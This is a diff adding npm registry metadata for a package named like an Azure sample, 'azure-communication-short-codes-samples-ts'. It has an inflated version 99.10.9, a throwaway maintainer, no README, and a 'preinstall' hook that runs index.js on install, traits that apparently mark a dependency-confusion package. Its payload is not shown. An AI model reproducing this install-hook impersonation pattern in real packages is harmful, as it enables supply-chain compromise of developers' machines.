@@ -1,0 +1,62 @@
+{
+    "_id": "azure-communication-short-codes-samples-ts",
+    "name": "azure-communication-short-codes-samples-ts",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "azure-communication-short-codes-samples-ts",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "azure-communication-short-codes-samples-ts@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-XWE6/imZ2leAUsBlKXCyZWYi25zbjWNcMANehsk6JeMesUS3uDLqFQQ2g+55nvqHUVijFxWoiUni494N1brfJg==",
+                "shasum": "40c26d2c86989f3dc2ea473a8fa839bab6ea055d",
+                "tarball": "https://registry.npmjs.org/azure-communication-short-codes-samples-ts/-/azure-communication-short-codes-samples-ts-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5094,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOoIcACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmrHoA/+OcSmgi6UZFfo2Eonu1cuZPR9/eVF61YhFYRre/Oe/wLmpA23\r\nt0BNmOCNLOi3OK0kvOKX/xAVtzxjxlEHeDlijBRU1lfF1+53RtVHcPoEZHPp\r\nlFW/qIgs2hjTEOS8SFtN1ySTGN42ArjdHkkm+KirwcIlpiRSMFcQpG64re/M\r\nkazqn59dQFZJyeTYqUgBoqUnVOBkILA0CXS3NBzSJGeYK3NUydEkhGsdFKvt\r\nN9odYcX96icAFBo0WfhfhtH/GUhElayCrCgVRuSjZZiTcHCc+mQhXAaqpYdg\r\n3LpUikRCzL9wXMP+RmajKUD7HPoucOCGRDje3nfT2e9e2UNly8kadBM61MnQ\r\nckytCRXzZpjaPDelvQz7Wu3uKWSfL+CrfLXS2gJc28rPqOjuIga6+r5Wzx09\r\nx0WMKofOPMczmIELphiWsvYCifPuFkOcNzQAuaEFPNmlYLmNegYPMUymXwRZ\r\nRHhiniRB+9IS4MnL/LB4aufGZkdsF2TX4ODZ+IMWsbUHJCYIvtnHydxhnmEm\r\ndkd66JUBOURy/YXs27C9JBISdsQ4ab53Jo+Ll/b6ZllCuZRr0GuywI6QUPvk\r\neqRtooYCjsAkUss3iZpcKsrYOtxc8RYRMuaPCjDSAWtENI6ldhd52R7Ld0Ih\r\n3DFcXMy1LMT7E3vEZfRKq1jCUgdGHKNP1VQ=\r\n=lo+a\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "7bguzif6",
+                "email": "7bguzif6@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "7bguzif6",
+                    "email": "7bguzif6@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/azure-communication-short-codes-samples-ts_99.10.9_1648001564110_0.3100695761808603"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T02:12:44.110Z",
+        "99.10.9": "2022-03-23T02:12:44.253Z",
+        "modified": "2022-03-23T02:12:44.335Z"
+    },
+    "maintainers": [
+        {
+            "name": "7bguzif6",
+            "email": "7bguzif6@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
